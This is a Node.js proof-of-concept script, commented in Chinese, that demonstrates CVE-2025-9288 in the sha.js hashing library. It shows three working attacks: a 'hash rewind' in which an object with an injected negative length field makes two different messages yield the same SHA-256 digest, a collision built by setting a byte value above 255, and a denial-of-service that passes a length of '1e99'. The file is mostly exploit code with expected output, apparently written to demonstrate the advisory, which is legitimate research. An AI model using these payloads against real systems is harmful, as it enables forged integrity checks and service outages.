// CVE-2025-9288：https://github.com/browserify/sha.js/security/advisories/GHSA-95m3-7q98-8xr5
const sha = require('sha.js')
const { fork } = require('child_process')
const path = require('path')

const sha256 = (...messages) => {
    const hash = sha('sha256')
    messages.forEach((m) => hash.update(m))
    return hash.digest('hex')
}

/**
 * 场景模拟：Hash Rewind 哈希回退攻击
 * 用户1的原文：helloworld
 * 用户2的原文：abcdefghijklmnopqrstuvwxyz
 * 
 * 由于 sha.js 的漏洞，注入了 length 字段，导致 hash 值相同
 */
function hashRewind() {
    // 用户1的原文
    const plaintext1 = 'helloworld'
    const hash1 = sha256(plaintext1) //936a185caaa266bb9cbe981e9e05cb78cd732b0b3280eb944412bb6f8f8f07af

    // 用户2的原文
    const plaintext2 = 'abcdefghijklmnopqrstuvwxyz'
    const hash2 = sha256(plaintext2, { length: -plaintext2.length }, plaintext1) //936a185caaa266bb9cbe981e9e05cb78cd732b0b3280eb944412bb6f8f8f07af

    console.log(`plaintext1: ${plaintext1} hash: ${hash1}`)
    console.log(`plaintext2: ${plaintext2} hash: ${hash2}`)

    console.log("⚠️  Hash Rewind 验证", hash1 === hash2 ? '成功' : '失败')
}

/**
 * 场景模拟：Hash Collision 哈希碰撞
 * 
 * 由于 sha.js 做 hash 时，会做 & 0xff 操作，
 * 这里对第一个字节进行篡改（增加高8位，即增加 256），
 * 然后 hash 又会清除高8位，所以最终结果不变。
 * 等价于 value % 256（取模256）
 * 
 */
function hashCollision() {
    const plaintext1 = 'ABC'
    const hash1 = sha256(plaintext1);
    const buffer1 = Buffer.from(plaintext1); // <Buffer 41 42 43>

    console.log(`plaintext1: ${plaintext1} hash: ${hash1}`)

    const maliciousObject = {
        length: buffer1.length,
        0: buffer1[0] + 256, // 关键！篡改第一个字节为 65 + 256 = 321
        1: buffer1[1],        // 0x42 (66)
        2: buffer1[2]         // 0x43 plaintext(67)
    };
    const buffer2 = Array.from({ length: maliciousObject.length }, (_, i) => maliciousObject[i]);
    const plaintext2 = buffer2.map(c => String.fromCharCode(c)).join('');
    // const hash2 = sha256(plaintext2); // ok
    const hash2 = sha256(buffer2);

    console.log(`plaintext2: ${plaintext2} hash: ${hash2}`)

    console.log("⚠️  Hash Collision 验证", hash1 === hash2 ? '成功' : '失败')
}

function hashDoS() {
    console.log('[主进程] 开始处理DoS攻击模拟...');

    // 创建子进程来处理耗费资源的哈希计算
    const workerPath = path.join(__dirname, 'worker-hash.js');
    const worker = fork(workerPath);

    let time = 0; // 计数器从0开始
    const timer = setInterval(() => {
        time++;
        console.log(`程序无响应，hash DoS 攻击进行中...`);

        if (time >= 10) {
            console.log('[主进程] DoS 攻击模拟结束');
            clearInterval(timer);
            worker.kill(); // 终止子进程
        }
    }, 1000);

    // 监听子进程消息
    worker.on('message', (message) => {
        if (message.type === 'hash_complete') {
            console.log(`[主进程] 收到子进程哈希计算结果:`);
            console.log(`  - 哈希值: ${message.hash.substring(0, 32)}...`);
            console.log(`  - 计算耗时: ${message.duration}ms`);
            console.log(`  - 计算成功: ${message.success}`);
        } else if (message.type === 'hash_error') {
            console.error(`[主进程] 子进程哈希计算出错: ${message.error}`);
        }
    });

    worker.on('close', (code) => {
        console.log(`[主进程] 子进程已退出，退出码: ${code}`);
        console.log('⚠️  Hash DoS 验证成功')
    });

    worker.on('error', (error) => {
        console.error('[主进程] 子进程错误:', error);
    });

    // 准备耗费资源的计算任务
    const maliciousDoSObject = {
        length: '1e99' // 关键：字符串形式的巨大数字
    };
    worker.send({ maliciousDoSObject });
}

// hashRewind()
// hashCollision()
// hashDoS()
